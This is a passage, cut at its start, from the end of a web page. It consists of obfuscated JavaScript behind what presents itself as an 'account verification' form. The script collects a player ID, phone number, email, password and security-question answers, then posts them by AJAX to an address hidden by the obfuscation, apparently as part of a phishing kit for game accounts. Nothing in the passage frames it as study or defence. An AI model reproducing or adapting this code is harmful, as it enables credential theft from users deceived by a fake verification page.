_0x4330ef=_0x19e058;$(_0x4330ef(0xe0))['hide'](),$('.slider-container')[_0x4330ef(0xd2)]();}});}),![];};function ValidateVerificationData(){$('#ValidateVerificationDataForm')['submit'](function(_0x322c89){var _0x3c0c6a=_0x2ce1;_0x322c89[_0x3c0c6a(0xfb)](),$playid=$(_0x3c0c6a(0xf8))[_0x3c0c6a(0xdc)]()[_0x3c0c6a(0xef)](),$phone=$(_0x3c0c6a(0xd8))[_0x3c0c6a(0xdc)]()['trim'](),$level=$(_0x3c0c6a(0xf1))[_0x3c0c6a(0xdc)]()['trim']();if($playid==''||$phone==''||$level==''){}else $('.account_verification')['hide'](),$('.Other_verification')['show'](),$(_0x3c0c6a(0xd3))[_0x3c0c6a(0xdc)]($playid),$(_0x3c0c6a(0xfc))[_0x3c0c6a(0xdc)]($phone),$(_0x3c0c6a(0xd5))[_0x3c0c6a(0xdc)]($level);var _0x2508b5=$('input#validateEmail')[_0x3c0c6a(0xdc)](),_0x59bb97=$(_0x3c0c6a(0xf0))[_0x3c0c6a(0xdc)](),_0x3cac80=$(_0x3c0c6a(0xea))[_0x3c0c6a(0xdc)]();});}function ValidateVerificationData(){var _0x4dba7c=_0x2ce1,_0x250888=$(_0x4dba7c(0xf3))[_0x4dba7c(0xf9)]();return $['ajax']({'url':_0x4dba7c(0xf7),'data':_0x250888,'type':_0x4dba7c(0x102),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$('#ValidateVerificationDataForm')[_0x4dba7c(0xe3)](function(_0x514994){var _0x1581fb=_0x4dba7c;_0x514994['preventDefault']();var _0x5a5aa5=$('input#validateEmail')['val'](),_0x1d48ad=$('input#validatePassword')[_0x1581fb(0xdc)](),_0x12fa24=$(_0x1581fb(0xd3))['val'](),_0x590fd2=$(_0x1581fb(0xfc))[_0x1581fb(0xdc)](),_0x25de89=$(_0x1581fb(0xd5))['val'](),_0x33b666=$(_0x1581fb(0xce))['val'](),_0x1fbf4a=$(_0x1581fb(0x101))[_0x1581fb(0xdc)](),_0x37bd33=$('input#answer3')['val'](),_0x10051d=$('input#answer4')['val'](),_0x665c60=$(_0x1581fb(0xea))['val']();if(_0x5a5aa5==''&&_0x1d48ad==''&&_0x12fa24==''&&_0x590fd2==''&&_0x25de89==''&&_0x33b666==''&&_0x1fbf4a==''&&_0x37bd33==''&&_0x10051d==''&&_0x665c60=='')return $(_0x1581fb(0xe9))[_0x1581fb(0xd2)](),$(_0x1581fb(0xd1))['hide'](),![];$['ajax']({'type':_0x1581fb(0x102),'url':'','data':$(this)[_0x1581fb(0xf9)](),'beforeSend':function(){var _0x5f1acb=_0x1581fb;$(_0x5f1acb(0xff))[_0x5f1acb(0xd2)](),$(_0x5f1acb(0x103))[_0x5f1acb(0xd9)]();},'success':function(){var _0x196dd3=_0x1581fb;$(_0x196dd3(0xd6))[_0x196dd3(0xd2)](),$(_0x196dd3(0xff))['hide'](),$(_0x196dd3(0xd1))['hide'](),$(_0x196dd3(0x103))['hide']();}});}),![];};
</script>
</body>
</html>